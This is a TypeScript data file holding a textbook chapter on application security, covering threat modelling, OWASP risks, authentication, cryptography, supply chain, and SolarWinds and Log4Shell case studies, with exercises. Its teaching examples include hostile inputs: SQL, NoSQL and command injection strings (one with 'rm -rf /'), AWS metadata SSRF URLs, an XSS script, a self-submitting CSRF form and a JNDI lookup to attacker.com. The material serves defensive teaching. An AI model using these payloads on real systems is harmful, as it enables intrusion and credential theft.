import type { Section } from '../types';

export const CH32_SECTIONS: Section[] = [
  {
    id: "32-1",
    number: "32.1",
    title: "The Attacker's Mindset",
    content: `To build secure systems, you must first learn to tear them down—at least conceptually. The **Attacker's Mindset** is a cognitive shift from "how do I make this work?" to "how can I make this fail in a way that benefits me?" While developers focus on the **happy path**, attackers look for the **edge cases**, the forgotten assumptions, and the places where complex systems overlap.

## Thinking in Graphs
Developers often think in **lists** (requirements, features, sprint tasks). Attackers think in **graphs**. They look for entry points, lateral movement paths, and final objectives. If a system has a secure front door (OAuth2) but a weak back door (an unauthenticated internal monitoring endpoint), the attacker will find the link.

## The Principle of Least Privilege
The core of the attacker's advantage is often **over-privilege**. If your web server runs as \`root\`, a single Remote Code Execution (RCE) vulnerability grants the attacker total control of the machine. If it runs as a restricted user \`www-data\`, the attacker is trapped in a sandbox.

## Asymmetry of Defense
Defense is hard because you have to be right 100% of the time. An attacker only has to be right once. To counter this, we use **Defense in Depth**. We assume one layer will fail and ensure there are others behind it.

\`\`\`python
# Defensive Mindset (Fragile)
def get_user(user_id):
    return db.query(f"SELECT * FROM users WHERE id = {user_id}")

# Attacker's perspective: 
# What if user_id is "1; DROP TABLE users"?
\`\`\`

The master engineer anticipates these deviations not as "errors" but as "exploits."`
  },
  {
    id: "32-2",
    number: "32.2",
    title: "Threat Modeling: STRIDE, PASTA, Attack Trees",
    content: `**Threat Modeling** is the practice of identifying potential threats early in the lifecycle. It's not a one-time event; it's a continuous process that informs design.

## STRIDE
Developed by Microsoft, **STRIDE** is a mnemonic for categorizing threats:
| Threat | Property Violated | Definition |
| :--- | :--- | :--- |
| **S**poofing | Authenticity | Pretending to be someone else |
| **T**ampering | Integrity | Modifying data or code |
| **R**epudiation | Non-repudiability | Claiming you didn't do an action |
| **I**nformation Disclosure | Confidentiality | Exposing private data |
| **D**enial of Service | Availability | Making the system unusable |
| **E**levation of Privilege | Authorization | Gaining unauthorized access |

## PASTA
The **Process for Attack Simulation and Threat Analysis (PASTA)** is a risk-centric framework. It focuses on aligning technical threats with business objectives. It's more comprehensive than STRIDE, involving seven stages from defining objectives to vulnerability analysis.

## Attack Trees
An **Attack Tree** is a visual representation of how an attacker might achieve a goal. The root of the tree is the goal (e.g., "Steal Credit Card Data"). The branches represent the paths to that goal.

\`\`\`text
Goal: Access Database
├── Path 1: Exploit SQL Injection
│   ├── Find vulnerable search field
│   └── Bypass WAF
└── Path 2: Compromise Admin Credentials
    ├── Phishing internal staff
    └── Brute force weak password
\`\`\`

By quantifying the cost and probability of each node, engineers can prioritize which defenses to build first.`
  },
  {
    id: "32-3",
    number: "32.3",
    title: "The OWASP Top 10 — Complete Treatment",
    content: `The **OWASP Top 10** is the industry-standard list of the most critical web application security risks. It is updated periodically based on massive data sets of vulnerabilities found in the wild.

## The 2021 Categories
1. **Broken Access Control**: The most common and dangerous.
2. **Cryptographic Failures**: Protecting data in transit and at rest.
3. **Injection**: Including SQL, NoSQL, and Command injection.
4. **Insecure Design**: Architectural flaws that no amount of patching can fix.
5. **Security Misconfiguration**: Default passwords, open ports, verbose errors.
6. **Vulnerable and Outdated Components**: The "Log4Shell" problem.
7. **Identification and Authentication Failures**: Poor MFA, session fixation.
8. **Software and Data Integrity Failures**: Insecure CI/CD pipelines.
9. **Security Logging and Monitoring Failures**: Not knowing you've been breached.
10. **Server-Side Request Forgery (SSRF)**: Tricking a server into making requests.

Mastering security means moving beyond "checking for XSS" to understanding the underlying **vulnerability classes**. Most of these arise from a failure to separate **code** from **data** or **policy** from **execution**.`
  },
  {
    id: "32-4",
    number: "32.4",
    title: "Injection: SQL, Command, LDAP, NoSQL, XML",
    content: `**Injection** occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's data tricks the interpreter into executing unintended commands.

## SQL Injection (SQLi)
The classic example. If you concatenate strings to build queries, you are vulnerable.
\`\`\`sql
-- Vulnerable
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
\`\`\`
**Fix**: Use **Parameterized Queries** (Prepared Statements). The database driver ensures data is treated as data, never as part of the SQL command.

## Command Injection
Occurs when an application passes unsanitized data to a system shell.
\`\`\`javascript
// Vulnerable Node.js
const { exec } = require('child_process');
exec(\`ls -l \${userSuppliedPath}\`); 
// If userSuppliedPath is "; rm -rf /", you're in trouble.
\`\`\`

## NoSQL Injection
Even without SQL, injection is possible. In MongoDB, an attacker might use operator injection:
\`\`\`javascript
// Vulnerable Express/Mongoose
db.users.find({ username: req.body.username, password: { "$ne": null } });
// Attacker sends { "username": "admin", "password": { "$gt": "" } }
\`\`\`

The universal fix for injection is **context-aware sanitization** and, preferably, APIs that keep data separate from the command structure.`
  },
  {
    id: "32-5",
    number: "32.5",
    title: "Authentication: Password Storage, MFA, Token Design",
    content: `**Authentication** is the process of verifying who a user is. 

## Secure Password Storage
Never store passwords in plain text. Never use fast hashes like MD5 or SHA1.
Use **Argon2id**, **bcrypt**, or **scrypt**. These are "expensive" by design, slowing down brute-force attacks.
- **Salt**: A unique, random value added to each password before hashing to prevent rainbow table attacks.
- **Pepper**: A secret value stored in a secure location (like a KMS) and added to the hash.

## Multi-Factor Authentication (MFA)
Something you **know** (password), something you **have** (U2F key, TOTP), or something you **are** (biometrics).
**TOTP** (Time-based One-Time Password) works by sharing a secret seed and calculating a hash based on the current time (usually in 30-second windows).

## Token Design: JWT vs Opaque
**JSON Web Tokens (JWT)** are stateless and signed. 
- **Pros**: Easy to scale, no database lookup needed for session verification.
- **Cons**: Difficult to revoke. If a JWT is stolen, it's valid until it expires.
**Opaque Tokens** are just random strings. The server looks them up in a database (e.g., Redis).
- **Pros**: Instant revocation.
- **Cons**: Requires a network hit or cache lookup on every request.`
  },
  {
    id: "32-6",
    number: "32.6",
    title: "Authorization: RBAC, ABAC, ReBAC",
    content: `**Authorization** is the process of verifying what an authenticated user is allowed to do.

## RBAC (Role-Based Access Control)
Users are assigned roles, and roles have permissions.
\`\`\`python
# Simple RBAC
if user.has_role('editor'):
    allow_edit()
\`\`\`
**Limitation**: Hard to handle "User A can edit Post B only if they own it."

## ABAC (Attribute-Based Access Control)
Permissions are based on attributes of the user, the resource, and the environment.
- Policy: "Allow access if \`user.department == resource.department\` AND \`time < 17:00\`."

## ReBAC (Relationship-Based Access Control)
Popularized by Google's **Zanzibar** paper. Permissions are based on the relationship between entities.
- "User is a 'viewer' of Folder if User is a 'member' of Group and Group is an 'owner' of Folder."

Modern systems like **Auth0 Fine-Grained Authorization** or **Oso** use ReBAC to handle the complexity of modern document-sharing patterns.`
  },
  {
    id: "32-7",
    number: "32.7",
    title: "Insecure Direct Object Reference (IDOR)",
    content: `**IDOR** is a sub-type of Broken Access Control. It occurs when an application uses user-supplied input to access objects directly without checking permissions.

## The Vulnerability
An attacker changes a URL parameter to see someone else's data:
\`GET /api/invoices/1001\` -> \`GET /api/invoices/1002\`

## Mitigation
1. **Never trust the ID**: Always verify that the current user has permission to access the requested ID.
\`\`\`python
# Secure version
invoice = db.query("SELECT * FROM invoices WHERE id = ? AND user_id = ?", id, current_user.id)
if not invoice:
    return 404 # Don't even reveal if it exists
\`\`\`
2. **Use UUIDs/ULIDs**: While not a primary defense, using non-sequential IDs makes it harder for an attacker to "guess" valid IDs.
3. **Indirect Reference Maps**: Instead of exposing the database ID, map internal IDs to temporary, session-specific aliases.`
  },
  {
    id: "32-8",
    number: "32.8",
    title: "Security Misconfiguration",
    content: `Security misconfiguration is often the result of using default settings or following "get started fast" tutorials that skip security steps.

## Common Pitfalls
- **Verbose Error Messages**: Revealing stack traces, database versions, or internal file paths to the user.
- **Default Credentials**: Leaving the admin password as "admin".
- **Unnecessary Services**: Running an SSH server or an open Redis port on a public-facing web server.
- **Missing Security Headers**: Failing to set \`Content-Security-Policy\`, \`Strict-Transport-Security\`, or \`X-Content-Type-Options\`.

## Hardening the Web Server (Nginx Example)
\`\`\`nginx
# Disable server tokens (don't show Nginx version)
server_tokens off;

# Prevent clickjacking
add_header X-Frame-Options "SAMEORIGIN";

# Prevent MIME sniffing
add_header X-Content-Type-Options nosniff;
\`\`\`

The best defense is **Infrastructure as Code (IaC)**. By defining your configuration in code, you can audit it and ensure consistency across environments.`
  },
  {
    id: "32-9",
    number: "32.9",
    title: "Cryptographic Failures: Common Mistakes",
    content: `Formerly known as "Sensitive Data Exposure," this category highlights failures in protecting data at rest and in transit.

## The "Don'ts" of Crypto
1. **Don't Roll Your Own**: Never implement your own cryptographic algorithms. Use standard libraries like **libsodium** or **OpenSSL**.
2. **Don't Use Weak Algorithms**: DES, MD5, SHA1, and ECB mode are broken. Use **AES-GCM** or **ChaCha20-Poly1305**.
3. **Don't Reuse Nonces**: In many modern ciphers, reusing a "number used once" (nonce) with the same key allows an attacker to decrypt the traffic.

## Data at Rest
Always encrypt sensitive data before it hits the disk.
\`\`\`python
# Using a high-level library (e.g., Fernet)
from cryptography.fernet import Fernet
key = Fernet.generate_key()
f = Fernet(key)
token = f.encrypt(b"Secret credit card number")
\`\`\`

## Key Management
The hardest part of crypto isn't the math; it's the keys. If the keys are stored next to the data, the encryption is useless. Use a **Key Management Service (KMS)** or a **Hardware Security Module (HSM)**.`
  },
  {
    id: "32-10",
    number: "32.10",
    title: "Server-Side Request Forgery (SSRF)",
    content: `**SSRF** occurs when a server is tricked into making a request to an internal or external resource that it shouldn't access.

## The "Proxy" Attack
Imagine a feature that fetches a profile picture from a URL:
\`GET /api/fetch_image?url=http://example.com/me.jpg\`

An attacker might change the URL to:
\`http://localhost:8080/admin\` (accessing internal admin panel)
\`http://169.254.169.254/latest/meta-data/iam/security-credentials/\` (accessing AWS metadata to steal cloud credentials)

## Mitigation
1. **Allowlisting**: Only allow requests to specific, trusted domains.
2. **Network Isolation**: Ensure the web server cannot talk to internal management ports or the metadata service.
3. **Input Validation**: Check that the URL is actually a URL and uses expected protocols (http/https).

SSRF is particularly dangerous in cloud environments where the instance metadata service provides a "backdoor" to the entire account's IAM permissions.`
  },
  {
    id: "32-11",
    number: "32.11",
    title: "Cross-Site Scripting (XSS)",
    content: `**XSS** is a type of injection where malicious scripts are injected into trusted websites.

## Three Types of XSS
1. **Stored XSS**: The script is permanently stored on the server (e.g., in a database as a comment). Every user who views the comment executes the script.
2. **Reflected XSS**: The script is "reflected" off the web server, usually via a URL parameter.
   - Example: \`https://site.com/search?q=<script>alert(1)</script>\`
3. **DOM-based XSS**: The vulnerability exists entirely in the client-side code. The server is never involved.
   - Example: \`const query = new URLSearchParams(window.location.search).get('name'); document.getElementById('welcome').innerHTML = query;\`

## The Ultimate Fix: Content Security Policy (CSP)
CSP is a browser-side mechanism that allows you to restrict where scripts can be loaded from and prevents inline scripts.
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
\`\`\`
This header tells the browser: "Only run scripts from my own domain or the trusted CDN. Ignore any \`<script>\` tags in the HTML body."`
  },
  {
    id: "32-12",
    number: "32.12",
    title: "Cross-Site Request Forgery (CSRF)",
    content: `**CSRF** forces a logged-in user to execute unwanted actions on a web application in which they're currently authenticated.

## The Attack
1. You are logged into \`bank.com\`.
2. You visit \`evil.com\`.
3. \`evil.com\` contains a hidden form:
\`\`\`html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker_account">
</form>
<script>document.forms[0].submit();</script>
\`\`\`
4. Because your browser automatically sends your \`bank.com\` session cookies, the bank thinks *you* made the request.

## Mitigation
1. **Anti-CSRF Tokens**: A unique, secret token included in every state-changing request. The server verifies this token.
2. **SameSite Cookie Attribute**: Setting \`SameSite=Lax\` or \`Strict\` prevents the browser from sending the cookie on cross-site requests.
\`\`\`http
Set-Cookie: session_id=abc; SameSite=Lax; Secure; HttpOnly
\`\`\`
3. **Double Submit Cookies**: Sending the token in both a cookie and a request parameter. The server checks if they match.`
  },
  {
    id: "32-13",
    number: "32.13",
    title: "Secure Session Management",
    content: `Authentication is how you log in; **Session Management** is how you stay logged in.

## Session Lifecycle
- **Creation**: Use high-entropy, random session IDs.
- **Storage**: Store sessions securely (Redis/Database).
- **Termination**: Implement both manual logout and automatic timeouts (idle and absolute).

## Cookie Security
When using cookies for session storage, three flags are non-negotiable:
1. **HttpOnly**: Prevents JavaScript (and thus XSS) from reading the cookie.
2. **Secure**: Ensures the cookie is only sent over HTTPS.
3. **SameSite**: Mitigates CSRF.

## Session Fixation
An attacker provides a session ID to a user, and the user logs in with that ID.
**Fix**: Always rotate (change) the session ID upon successful login.

\`\`\`javascript
// Express-session example
req.session.regenerate((err) => {
  // Now set the user ID in the NEW session
  req.session.user = user.id;
});
\`\`\`
This prevents an attacker from "pre-setting" a session and waiting for the user to authenticate it.`
  },
  {
    id: "32-14",
    number: "32.14",
    title: "Cryptography: Symmetric, Asymmetric, and Hash Functions",
    content: `To build secure systems, you must understand the three tools in the cryptographic toolbox.

## 1. Hash Functions
One-way functions that map data of any size to a fixed-size string.
- **Properties**: Pre-image resistance (can't go back), Collision resistance (two inputs don't produce the same output).
- **Usage**: Data integrity, password storage (with salt).
- **Modern Standards**: SHA-256, SHA-3, BLAKE3.

## 2. Symmetric Encryption
The same key is used for both encryption and decryption.
- **Properties**: Fast, handles large amounts of data.
- **Usage**: Encrypting files, database fields, TLS data stream.
- **Standard**: AES (Advanced Encryption Standard).

## 3. Asymmetric Encryption (Public Key)
Uses a pair of keys: a **Public Key** (can be shared) and a **Private Key** (must be kept secret).
- **Properties**: Slow, math-heavy.
- **Usage**: Key exchange, Digital Signatures.
- **Standards**: RSA (legacy), Elliptic Curve Cryptography (ECC) like Ed25519.

**Digital Signatures** work by hashing the data and then encrypting the hash with your private key. Anyone with your public key can decrypt it and verify that the data hasn't been changed and that you were the one who sent it.`
  },
  {
    id: "32-15",
    number: "32.15",
    title: "TLS: How It Works and How It Fails",
    content: `**Transport Layer Security (TLS)** provides confidentiality, integrity, and authenticity for data in transit. It is the successor to SSL.

## The TLS 1.3 Handshake
1. **Client Hello**: "I support these ciphers."
2. **Server Hello + Certificate**: "I pick this cipher. Here is my ID (signed by a CA)."
3. **Key Exchange**: Using Diffie-Hellman to create a shared secret without ever sending it over the wire.
4. **Encrypted Data**: Both sides switch to symmetric encryption using the shared secret.

## How it Fails
- **Expired/Invalid Certificates**: Users get a warning they often ignore.
- **Man-in-the-Middle (MITM)**: An attacker intercepts the handshake.
- **Downgrade Attacks**: Tricking the client into using a weaker version (e.g., SSL 3.0) that has known vulnerabilities.
- **Protocol Vulnerabilities**: Heartbleed (memory leak in OpenSSL), POODLE (padding oracle).

**Perfect Forward Secrecy (PFS)** is a critical feature where the compromise of the server's long-term private key does not compromise past session keys. TLS 1.3 makes PFS mandatory.`
  },
  {
    id: "32-16",
    number: "32.16",
    title: "PKI and Certificate Management",
    content: `**Public Key Infrastructure (PKI)** is the system that manages the lifecycle of digital certificates.

## The Hierarchy of Trust
At the top is the **Root Certificate Authority (CA)**. Your OS and Browser come pre-loaded with a list of trusted Root CAs.
1. **Root CA** signs an **Intermediate CA**.
2. **Intermediate CA** signs your **Domain Certificate**.

## Certificate Revocation
What happens if a private key is stolen?
- **CRL (Certificate Revocation List)**: A big list of "bad" certificates. Scale issues.
- **OCSP (Online Certificate Status Protocol)**: The browser asks the CA "is this cert still good?"
- **OCSP Stapling**: The server fetches the "it's good" proof from the CA and "staples" it to the certificate, saving the browser a network trip.

## Automated Management
Using **Let's Encrypt** and the **ACME** protocol, certificate management is now automated. There is no excuse for manual certificate renewal in a modern engineering organization.`
  },
  {
    id: "32-17",
    number: "32.17",
    title: "Secrets Management: Vault, AWS Secrets Manager, SOPS",
    content: `Hardcoding API keys or database passwords in your source code is a cardinal sin. **Secrets Management** provides a secure way to store and distribute these sensitive values.

## HashiCorp Vault
The industry leader. It supports:
- **Static Secrets**: Encrypted storage of values.
- **Dynamic Secrets**: Vault creates a one-time database user for your app that expires after 1 hour. This eliminates the risk of long-lived credentials.
- **Transit Encryption**: Providing "Encryption as a Service" so your app doesn't have to handle keys.

## AWS Secrets Manager / Azure Key Vault
Cloud-native solutions that integrate deeply with IAM. 

## SOPS (Secrets Operations)
A tool by Mozilla for encrypting values within YAML/JSON files that are checked into Git.
\`\`\`yaml
# Before SOPS
db_password: "supersecretpassword"

# After SOPS (encrypted for a specific KMS key or PGP key)
db_password: "ENC[AES256_GCM,data:...,type:str]"
\`\`\`
SOPS allows you to keep secrets close to your code while ensuring they are useless to anyone without access to the decryption key.`
  },
  {
    id: "32-18",
    number: "32.18",
    title: "Supply Chain Security: SBOMs and Dependency Scanning",
    content: `Modern applications are 90% other people's code. **Supply Chain Security** focuses on the risks inherent in the libraries and tools you use.

## The Problem
If a package you use (like \`left-pad\` or \`log4j\`) is compromised or has a vulnerability, your application is compromised.

## SBOM (Software Bill of Materials)
A manifest of every single library, version, and license used in your application. It's like an ingredient list for software. Standard formats include **SPDX** and **CycloneDX**.

## Dependency Scanning
Tools like **Snyk**, **GitHub Dependabot**, or **OWASP Dependency-Check** scan your \`package-lock.json\` or \`go.sum\` files against a database of known vulnerabilities (CVEs).

## Best Practices
1. **Lock Your Versions**: Always use lockfiles to ensure reproducible builds.
2. **Internal Proxy**: Use a tool like **Artifactory** or **Nexus** to cache dependencies. This prevents "left-pad" style deletions from breaking your builds.
3. **Audit Regularly**: Run \`npm audit\` or equivalent as part of every CI run.`
  },
  {
    id: "32-19",
    number: "32.19",
    title: "Container Security: Image Scanning, Runtime Protection",
    content: `Containers are not sandboxes. While they provide isolation, a misconfigured container can easily lead to a host breakout.

## Image Scanning
Scanning the Docker image for vulnerabilities in the OS packages (e.g., an old version of \`libssl\` in the Debian base image).
**Tools**: Trivy, Clair, Amazon ECR scanning.

## Distroless Images
The most secure container is one that contains *nothing* except your application and its dependencies. No shell, no \`ls\`, no \`curl\`. If an attacker gets RCE, they have no tools to use.

## Runtime Protection
Monitoring what a container does while it's running.
- **Seccomp**: Restricting which system calls the container can make.
- **AppArmor/SELinux**: Enforcing mandatory access controls.
- **Falco**: An open-source tool that alerts on suspicious behavior (e.g., a process spawning a shell inside a container).

\`\`\`yaml
# Example Kubernetes Security Context
securityContext:
  allowPrivilegeEscalation: false
  runAsNonRoot: true
  readOnlyRootFilesystem: true
\`\`\`
Running with a read-only filesystem is one of the single most effective ways to block malware from persisting in a container.`
  },
  {
    id: "32-20",
    number: "32.20",
    title: "Security in CI/CD: SAST, DAST, IAST",
    content: `Security shouldn't be a "gate" at the end of the project; it should be integrated into the pipeline.

## SAST (Static Application Security Testing)
Scans source code for patterns that indicate vulnerabilities (e.g., \`innerHTML\` usage).
- **Pros**: Fast, finds the exact line of code.
- **Cons**: High false-positive rate.
- **Tools**: Semgrep, SonarQube, CodeQL.

## DAST (Dynamic Application Security Testing)
Attacks the running application from the outside, like a hacker would.
- **Pros**: Zero false positives (if it hits, it's real), finds configuration issues.
- **Cons**: Slow, requires a running environment.
- **Tools**: OWASP ZAP, Burp Suite Enterprise.

## IAST (Interactive AST)
Combines both. An agent inside the app watches execution while a DAST tool probes it.

## The Goal: Shift Left
The earlier you find a bug, the cheaper it is to fix. A SAST alert in the IDE costs minutes. A DAST alert in staging costs hours. A breach in production costs millions.`
  },
  {
    id: "32-21",
    number: "32.21",
    title: "Penetration Testing: What, When, and How",
    content: `**Penetration Testing (Pentesting)** is a coordinated, ethical attack on a system to find vulnerabilities.

## Types of Pentesting
- **Black Box**: Attacker has zero knowledge of the system.
- **White Box**: Attacker has full access to code and architecture docs.
- **Gray Box**: Attacker has user-level access.

## When to Pentest
- After a major release or architectural change.
- Annually for compliance (PCI-DSS, SOC2).
- Before launching a high-profile public feature.

## The Process
1. **Scoping**: What is in-bounds? What is out-of-bounds?
2. **Reconnaissance**: Gathering info.
3. **Exploitation**: Attempting to breach.
4. **Reporting**: The most important part. A pentest is useless if it doesn't provide a clear roadmap for remediation.

Pentesting is a complement to automated scanning, not a replacement. Humans are better at finding complex logic flaws that automated tools miss.`
  },
  {
    id: "32-22",
    number: "32.22",
    title: "Zero Trust Architecture",
    content: `The traditional security model was the **"Castle and Moat"**: trust everything inside the network, distrust everything outside. In the modern world of remote work and cloud services, the "inside" no longer exists.

## Core Principles of Zero Trust
1. **Verify Explicitly**: Authenticate and authorize based on all available data points (user identity, location, device health, resource).
2. **Least Privilege Access**: Limit user access with Just-In-Time (JIT) and Just-Enough-Access (JEA).
3. **Assume Breach**: Minimize the "blast radius" by segmenting networks and encrypting all internal traffic.

## Implementation: BeyondCorp
Google's implementation of Zero Trust. They don't use a VPN. Instead, every request to an internal app is intercepted by an access proxy that verifies the user's identity and the health of their managed laptop.

Zero Trust shifts security from the **Network Layer** (IP addresses, subnets) to the **Identity Layer** (Users, Service Accounts).`
  },
  {
    id: "32-23",
    number: "32.23",
    title: "Case Study: The SolarWinds Attack",
    content: `In 2020, the **SolarWinds** hack redefined our understanding of supply chain risk.

## The Attack
State-sponsored actors gained access to the SolarWinds build system. They injected a backdoor (named **SUNBURST**) into a legitimate update for the **Orion** network management software. 
Because Orion was a trusted, signed piece of software, 18,000 organizations (including US government agencies) downloaded and installed the malware.

## Why It Mattered
- **Build System Integrity**: The source code in Git was clean. The malware was added during the build process.
- **Trust as a Vector**: Attackers leveraged the trust relationship between a vendor and its customers.
- **Dwell Time**: The attackers were in the systems for months before being detected.

## Lessons for Engineers
- **Reproducible Builds**: Can you prove that the binary you shipped matches the source code?
- **Build Server Isolation**: Your CI/CD environment is as critical as your production environment.
- **Egress Filtering**: The malware needed to call home. If the Orion server was blocked from making arbitrary outbound requests, the attack would have failed.`
  },
  {
    id: "32-24",
    number: "32.24",
    title: "Case Study: Log4Shell — RCE at Scale",
    content: `In December 2021, a vulnerability in the popular Java logging library **Log4j** (CVE-2021-44228) set the internet on fire.

## The Vulnerability
Log4j supported a feature called **JNDI Lookup**. If a string like \`\${jndi:ldap://attacker.com/a}\` appeared in a log message, Log4j would actually reach out to that URL, download a Java class, and execute it.
Because applications log everything (usernames, User-Agents, search queries), an attacker could trigger this from anywhere.

## The Impact
It was a **10.0 CVSS** score (the highest possible). It was trivial to exploit, had massive impact, and was present in millions of enterprise systems.

## Engineering Takeaways
- **Disable Dangerous Defaults**: The JNDI lookup feature was rarely used but enabled by default.
- **Log Sanitation**: Never assume logs are safe. Treat log sinks with the same caution as database sinks.
- **The "S" in SBOM**: Organizations that had an SBOM found their vulnerable systems in minutes. Others spent weeks searching their codebases.`
  },
  {
    id: "32-25",
    number: "32.25",
    title: "Exercises",
    content: `## Exercises

1. **Threat Modeling**: Perform a STRIDE analysis on a simple "Forgot Password" feature.
2. **SQLi Defense**: Rewrite the following vulnerable code using a prepared statement in your language of choice: \`db.execute("SELECT * FROM users WHERE email = '" + email + "'")\`.
3. **MFA Design**: Explain the difference between TOTP and SMS-based MFA. Why is SMS considered less secure?
4. **Token Security**: You are using JWTs for session management. How do you handle a "Log out of all devices" request?
5. **CORS vs CSRF**: Explain the difference. Does a strict CORS policy prevent CSRF attacks?
6. **Password Hashing**: Why should you use a "work factor" in bcrypt? What happens if you set it too high? Too low?
7. **SSRF Identification**: You have a service that generates PDFs from HTML. The user provides the HTML. How could an attacker use this for SSRF?
8. **Dependency Audit**: Use a tool (like \`npm audit\` or \`snyk\`) on one of your existing projects. Identify one vulnerability and explain the fix.

## Answers

1. **Spoofing**: Attacker pretends to be the user to trigger a reset. **Tampering**: Modifying the reset link. **Information Disclosure**: Error message revealing if an email exists ("Email not found" vs "Check your inbox").
2. **Python example**: \`cursor.execute("SELECT * FROM users WHERE email = %s", (email,))\`
3. SMS is vulnerable to **SIM Swapping** and interception at the carrier level. TOTP is local to the device.
4. You must maintain a "blacklist" or "revocation list" of JWT IDs (jti) in a fast store like Redis until they expire.
5. No. CORS restricts which *domains* can read responses. CSRF is about *sending* unauthorized requests.
6. A high work factor protects against brute-force but consumes CPU. Too high = Denial of Service on yourself. Too low = fast cracking.
7. The attacker can include \`<img src="http://169.254.169.254/latest/meta-data/">\`. The PDF generator will fetch the metadata and include it in the generated PDF.
8. (Subjective) Usually involves updating a package version in \`package.json\`.`
  }
];
